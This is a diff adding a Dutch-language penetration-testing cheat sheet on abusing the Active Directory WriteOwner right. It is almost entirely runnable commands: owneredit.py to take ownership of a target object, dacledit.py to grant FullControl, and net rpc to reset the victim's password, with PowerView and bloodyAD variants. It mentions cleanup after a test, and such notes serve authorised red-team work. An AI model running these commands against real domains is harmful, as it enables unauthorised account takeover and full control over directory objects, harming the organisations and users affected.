@@ -1,0 +1,31 @@
+# WriteOwner Abuse — Object eigenaar wijzigen → WriteDACL verkrijgen
+# WriteOwner laat je de eigenaar van een AD object wijzigen
+# Als eigenaar krijg je automatisch WriteDACL, waarmee je elke ACL kunt zetten
+#
+# === Vereisten ===
+# - WriteOwner recht op het doelobject
+#
+# === Voorbeelden ===
+
+# Stap 1: Eigenaar wijzigen naar jezelf (owneredit.py)
+python3 owneredit.py -action write -owner ATTACKER_USER -target TARGET_USER DOMAIN/USER:'PASS' -dc-ip DC_IP
+
+# Stap 2: Nu heb je WriteDACL — GenericAll toekennen
+python3 dacledit.py -action write -rights FullControl -principal ATTACKER_USER -target TARGET_USER DOMAIN/USER:'PASS' -dc-ip DC_IP
+
+# Stap 3: Exploit de GenericAll (bijv. wachtwoord resetten)
+net rpc password TARGET_USER 'NewPass123!' -U DOMAIN/ATTACKER_USER%'PASS' -S DC_IP
+
+# Via PowerView
+powershell -c "Import-Module .\PowerView.ps1; Set-DomainObjectOwner -Identity TARGET_USER -OwnerIdentity ATTACKER_USER -Verbose"
+powershell -c "Import-Module .\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity TARGET_USER -PrincipalIdentity ATTACKER_USER -Rights All -Verbose"
+
+# Via bloodyAD
+python3 bloodyAD.py -u USER -p 'PASS' -d DOMAIN --host DC_IP set owner TARGET_USER ATTACKER_USER
+
+# Eigenaar lezen (verificatie)
+python3 owneredit.py -action read -target TARGET_USER DOMAIN/USER:'PASS' -dc-ip DC_IP
+
+# Noot: WriteOwner → WriteDACL → GenericAll → volledige controle
+# Noot: Vergeet niet op te ruimen na de test (eigenaar terugzetten)
+# Noot: BloodHound edge: WriteOwner
